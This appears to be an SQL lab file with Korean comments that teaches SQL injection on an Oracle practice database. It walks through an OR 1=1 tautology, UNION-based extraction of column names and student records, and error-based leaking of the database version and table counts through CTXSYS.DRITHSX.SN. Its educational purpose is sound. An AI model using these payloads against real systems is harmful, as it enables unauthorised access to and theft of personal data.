-- SQL 삽입 공격 예제 쿼리
SELECT * FROM STUDENT;

-- 공격자가 STUDENT 테이블의 정보를 탈취하려고 함
-- 제공되는 기능이 학번을 입력하면 해당 학번에 대한 정보만 보여줌
-- 공격자가 학번을 모르는 상태에서 1234 임의로 보냄 -> 정보가 표현되지 않음
SELECT * FROM student
WHERE stdNo = '1234';

-- (공격 예시)
-- 사용자의 입력값이 1234 or 1=1 라면, 전달된 OR 절에 의해서 앞의 stdNo는 무력화 됨
SELECT * FROM student
WHERE stdNo = '1234' OR 1=1 --;
;

-- 특정 stdNo에 대한 학생의 정보만 확인하도록 하는 것이 목적임
-- SQL 취약점인 OR 절에 의해서 모든 학생의 정보가 조회될 수 있음

-- union 키워드
-- 두개의 질의 결과를 결합하기 위한 쿼리

SELECT clientNo, bsQty FROM booksale WHERE clientNo=2;

SELECT clientNo, bsQty FROM booksale WHERE clientNo=1
UNION
SELECT clientNo, bsQty FROM booksale WHERE clientNo=2;

-- UNION 되는 컬럼이 동일하지 않아도 타입이 동일하면 결과가 출력된다
SELECT clientNo, bsQty FROM booksale WHERE clientNo=1
UNION
SELECT bookNo, bsQty FROM booksale WHERE clientNo=2;

-- (타입 다르면 오류)
SELECT clientNo, bsQty FROM booksale WHERE clientNo=1
UNION
SELECT bookNo, bsDate FROM booksale WHERE clientNo=2;

-- (컬럼 수가 달라도 오류)
SELECT clientNo, bsQty FROM booksale WHERE clientNo=1
UNION
SELECT bookNo, bsQty, bsDate FROM booksale WHERE clientNo=2;

-- 즉, UNION은 결합되는 질의 결과의 컬럼 수가 같아야 하고, 매핑되는 컬럼들 간의 타입이 동일해야 함
-- 이를 이용해서 null을 사용
SELECT clientNo, bsQty, NULL FROM booksale WHERE clientNo=1
UNION
SELECT bookNo, bsQty, bsDate FROM booksale WHERE clientNo=2;

-- bookSale 테이블과 book 테이블간의 결합
SELECT bookNo, bsQty, bsDate FROM bookSale WHERE clientNo=2
UNION
SELECT NULL, NULL, NULL FROM book;

-- DUAL 테이블과 UNION 예제
SELECT * FROM student WHERE stdNo='' OR 1=1
UNION
SELECT NULL, NULL, NULL, NULL, NULL, NULL FROM DUAL;

SELECT * FROM USER_TABLES;

SELECT * FROM ALL_TAB_COLUMNS;

SELECT * FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='STUDENT';

SELECT * FROM student WHERE stdNo='' OR 1=1
UNION
SELECT COLUMN_NAME, NULL, NULL, NULL, NULL, NULL FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='STUDENT';

SELECT * FROM student WHERE stdNo='' OR 1=1
UNION
SELECT stdAddress, TO_CHAR(stdBirth), TO_NUMBER(dptNo), NULL, NULL, NULL  FROM student;

-- 오라클의 버전 확인
SELECT banner from v$version where banner like '%Oracle%';

-- 취약한 프로시저 활용해서 위 쿼리를 서브쿼리로 실행하고 에러 유발
-- CTXSYS.DRITHSX.SN(param1, param2): param2는 서브쿼리여야 함
-- CTXSYS.DRITHSX.SN은 두번째 파라미터 서브쿼리 결과를 활용해서 다음 검색을 진행함
-- 서브쿼리 결과는 검색에 이용할 수 있는 키워드여야 함
SELECT CTXSYS.DRITHSX.SN(user, (SELECT banner from v$version where banner like '%Oracle%')) FROM DUAL;
-- 올바른 파라미터를 넣어주지 않았으므로 오류가 날 것
-- 그러나 에러 메세지에 서브쿼리 결과가 등장함

SELECT * FROM student WHERE stdNo='2023001' 
AND CTXSYS.DRITHSX.SN(user, (SELECT banner from v$version where banner like '%Oracle%'))=1;

SELECT * FROM student WHERE stdNo='2023001' 
AND CTXSYS.DRITHSX.SN(user, (SELECT COUNT(TABLE_NAME) FROM USER_TABLES))=1;

SELECT TABLE_NAME FROM (SELECT TABLE_NAME, ROWNUM AS rnum FROM USER_TABLES);